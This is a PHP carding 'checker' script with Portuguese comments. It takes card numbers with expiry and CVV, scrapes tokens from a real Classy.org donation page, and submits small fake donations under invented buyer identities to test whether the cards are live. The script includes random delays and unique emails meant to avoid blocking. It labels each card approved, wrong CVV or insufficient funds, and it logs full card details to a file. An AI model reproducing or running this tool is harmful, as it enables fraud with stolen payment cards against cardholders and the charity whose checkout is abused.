<?php
error_reporting(0);
ignore_user_abort(true);

$inicio = microtime(true);

// ==================== CAPTURAR DADOS DO CARTÃO ====================
$lista = $_GET['lista'] ?? '';
$lista = str_replace([" ", "%20", "/"], "|", $lista);
$lista = preg_replace('/[ -]+/', '-', $lista);
$separar = explode("|", $lista);
$cc = trim($separar[0] ?? '');
$mes = trim($separar[1] ?? '');
$ano = trim($separar[2] ?? '');
$cvv = trim($separar[3] ?? '');

if (!$cc || !$mes || !$ano || !$cvv) {
    die('❌ ERRO | Formato inválido. Use: numero|mes|ano|cvv');
}

// ==================== DELAY INICIAL (EVITAR BLOQUEIO) ====================
$delay = rand(20, 30);
sleep($delay);

// ==================== FUNÇÃO PARA FAZER REQUISIÇÕES COM CURL ====================
function fazerRequisicao($url, $headers = [], $postFields = null, $cookieFile = null) {
    $ch = curl_init($url);
    $options = [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_ENCODING => 'gzip, deflate', // Aceitar compressão
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ];
    
    if ($headers) {
        $options[CURLOPT_HTTPHEADER] = $headers;
    }
    
    if ($postFields) {
        $options[CURLOPT_POST] = true;
        $options[CURLOPT_POSTFIELDS] = $postFields;
    }
    
    if ($cookieFile) {
        $options[CURLOPT_COOKIEJAR] = $cookieFile;
        $options[CURLOPT_COOKIEFILE] = $cookieFile;
    }
    
    curl_setopt_array($ch, $options);
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    $error = curl_error($ch);
    curl_close($ch);
    
    return ['response' => $response, 'info' => $info, 'error' => $error];
}

// ==================== PASSO 1: OBTER COOKIES E TOKENS FRESCOS ====================
$cookieFile = __DIR__ . '/cookies_classy.txt';
if (file_exists($cookieFile)) unlink($cookieFile); // Sempre começar limpo

// Headers para a página inicial
$headersIniciais = [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control: max-age=0',
    'sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: none',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1'
];

$resInicial = fazerRequisicao('https://www.classy.org/give/313412/', $headersIniciais, null, $cookieFile);

if ($resInicial['error']) {
    die('ERRO ao acessar página inicial: ' . $resInicial['error']);
}

// Extrair tokens da resposta (podem estar em meta tags ou headers)
$html = $resInicial['response'];

// Tentar extrair csrf-token de meta tag
preg_match('/<meta\s+name="csrf-token"\s+content="([^"]+)"/i', $html, $metaCsrf);
$csrfToken = $metaCsrf[1] ?? '';

// Tentar extrair x-xsrf-token de meta tag
preg_match('/<meta\s+name="x-xsrf-token"\s+content="([^"]+)"/i', $html, $metaXSRF);
$xsrfToken = $metaXSRF[1] ?? '';

// Se não encontrou, tenta nos cookies
if (!$xsrfToken) {
    // O cookie XSRF-TOKEN pode estar no arquivo de cookies
    $cookieContent = file_get_contents($cookieFile);
    preg_match('/XSRF-TOKEN\s+([^\s]+)/', $cookieContent, $cookieXSRF);
    $xsrfToken = $cookieXSRF[1] ?? '';
}

// Fallback (último recurso) - mas idealmente não deve acontecer
if (!$csrfToken) $csrfToken = 'pRM6Y5rY-YnzqVTkydcwIjKaGtu4bxj2F48Q';
if (!$xsrfToken) $xsrfToken = 'sqJxUdjH-eWqlEVc426l2jLGJ9NRP0BM2a-8';

// ==================== PASSO 2: PREPARAR DADOS DO COMPRADOR ====================
$primeiroNome = "Joao";
$ultimoNome = "Silva";
$nomeCompleto = "$primeiroNome $ultimoNome";
$email = "joao.silva" . rand(100,999) . "@gmail.com"; // email único para evitar bloqueios
$telefoneFormatado = "(11) 99999" . rand(1000,9999);
$endereco = [
    'address1' => 'Rua Nova Jesuralem',
    'address2' => '',
    'city' => 'Guadalupe',
    'state' => 'PI',
    'postal_code' => '64840-000',
    'country' => 'BR'
];
$anoCompleto = (strlen($ano) == 2) ? '20' . $ano : $ano;

// ==================== PASSO 3: MONTAR REQUISIÇÃO DE CHECKOUT ====================
$url = "https://www.classy.org/frs-api/campaign/313412/checkout";

$headersCheckout = [
    'accept: application/json, text/plain, */*',
    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type: application/json;charset=UTF-8',
    'csrf-token: ' . $csrfToken,
    'origin: https://www.classy.org',
    'referer: https://www.classy.org/give/313412/',
    'sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'x-xsrf-token: ' . $xsrfToken
];

// Token do Stripe (simulado, mas necessário)
$tokenCartao = "tok_visa"; // Em produção, gere um token real via Stripe.js

$data = [
    "payment" => [
        "raw_currency_code" => "BRL",
        "paypal" => ["status" => "inactive"],
        "paypal_commerce" => ["status" => "inactive"],
        "venmo" => ["status" => "inactive"],
        "ach" => ["status" => "inactive"],
        "stripe" => [
            "status" => "ready",
            "source" => [
                "id" => "src_" . uniqid(),
                "object" => "source",
                "allow_redisplay" => "unspecified",
                "amount" => null,
                "card" => [
                    "address_line1_check" => null,
                    "address_zip_check" => null,
                    "brand" => "MasterCard",
                    "country" => "BR",
                    "cvc_check" => "unchecked",
                    "dynamic_last4" => null,
                    "exp_month" => (int)$mes,
                    "exp_year" => (int)$anoCompleto,
                    "funding" => "credit",
                    "last4" => substr($cc, -4),
                    "name" => $primeiroNome . ' ' . $ultimoNome,
                    "three_d_secure" => "optional",
                    "tokenization_method" => null
                ],
                "client_secret" => "src_client_secret_" . uniqid(),
                "created" => time(),
                "currency" => null,
                "flow" => "none",
                "livemode" => true,
                "owner" => [
                    "address" => [
                        "city" => $endereco['city'],
                        "country" => "BR",
                        "line1" => $endereco['address1'],
                        "line2" => $endereco['address2'],
                        "postal_code" => $endereco['postal_code'],
                        "state" => $endereco['state']
                    ],
                    "email" => $email,
                    "name" => $primeiroNome . ' ' . $ultimoNome,
                    "phone" => $telefoneFormatado
                ],
                "statement_descriptor" => null,
                "status" => "chargeable",
                "type" => "card",
                "usage" => "reusable"
            ]
        ],
        "cc" => ["status" => "inactive"],
        "creditee_team_id" => null,
        "method" => "Stripe",
        "gateway" => [
            "id" => "22718",
            "name" => "STRIPE",
            "status" => "ACTIVE",
            "currency" => "USD"
        ]
    ],
    "frequency" => "one-time",
    "items" => [
        [
            "type" => "donation",
            "product_name" => "Donation",
            "raw_final_price" => 2,
            "previous_frequency_price" => 0
        ]
    ],
    "fundraising_page_id" => null,
    "fundraising_team_id" => null,
    "designation_id" => 140716,
    "answers" => [],
    "billing_address1" => $endereco['address1'],
    "billing_address2" => $endereco['address2'],
    "billing_city" => $endereco['city'],
    "billing_state" => $endereco['state'],
    "billing_postal_code" => $endereco['postal_code'],
    "billing_country" => $endereco['country'],
    "comment" => "",
    "member_name" => $nomeCompleto,
    "member_email_address" => $email,
    "member_phone" => $telefoneFormatado,
    "is_anonymous" => false,
    "opt_in" => true,
    "opt_in_wording" => "It's okay to contact me in the future.",
    "application_id" => "14268",
    "billing_first_name" => $primeiroNome,
    "billing_last_name" => $ultimoNome,
    "fee_on_top" => true,
    "fixed_fot_percent" => 3,
    "fixed_fot_enabled" => true,
    "fee_on_top_amount" => 0.06,
    "gross_adjustment" => new stdClass(),
    "dedication" => null,
    "company_name" => null,
    "member_first_name" => $primeiroNome,
    "member_last_name" => $ultimoNome,
    "c_src" => [
        [
            "c_src" => "website",
            "c_src2" => "top-of-page-banner",
            "referrer" => "",
            "timestamp" => round(microtime(true) * 1000)
        ]
    ],
    "token" => $tokenCartao,
    "dafTransactionDetails" => new stdClass()
];

// ==================== PASSO 4: ENVIAR REQUISIÇÃO DE CHECKOUT ====================
$jsonData = json_encode($data, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

$resCheckout = fazerRequisicao($url, $headersCheckout, $jsonData, $cookieFile);

// ==================== PASSO 5: PROCESSAR RESPOSTA ====================
$cartao_formatado = "$cc|$mes|$ano|$cvv";
$tempo_execucao = round(microtime(true) - $inicio, 2);
$tag = "@cybersecofc";

if ($resCheckout['error']) {
    $resultado = "ERRO CURL: " . $resCheckout['error'];
} else {
    $http_code = $resCheckout['info']['http_code'];
    $resposta = $resCheckout['response'];
    
    // Tentar decodificar JSON
    $decodificado = json_decode($resposta, true);
    
    if (json_last_error() === JSON_ERROR_NONE) {
        // Verificar se é sucesso
        if (isset($decodificado['status']) && $decodificado['status'] === 'success') {
            $resultado = "Aprovado";
        }
        // Verificar erros conhecidos
        elseif (isset($decodificado['error']['code'])) {
            switch ($decodificado['error']['code']) {
                case 'incorrect_cvc':
                    $resultado = "Cvv Incorreto";
                    break;
                case 'insufficient_funds':
                    $resultado = "Saldo Insuficiente";
                    break;
                default:
                    $resultado = "Die: " . ($decodificado['error']['message'] ?? 'Erro desconhecido');
            }
        }
        // Outros casos
        else {
            $resultado = "Die: " . json_encode($decodificado);
        }
    } else {
        // Resposta não JSON (pode ser bloqueio ou erro)
        if (strpos($resposta, 'cf-error-details') !== false) {
            $resultado = "Bloqueado pelo Cloudflare";
        } else {
            $resultado = "Die: resposta não JSON (HTTP $http_code)";
        }
    }
}

// ==================== SAÍDA NO FORMATO SOLICITADO ====================
echo "$cartao_formatado $resultado {$tempo_execucao}s $tag";

// Opcional: log para depuração
file_put_contents('classy_debug.log', date('Y-m-d H:i:s') . " | $cartao_formatado | HTTP {$resCheckout['info']['http_code']} | $resultado\n", FILE_APPEND);
?>
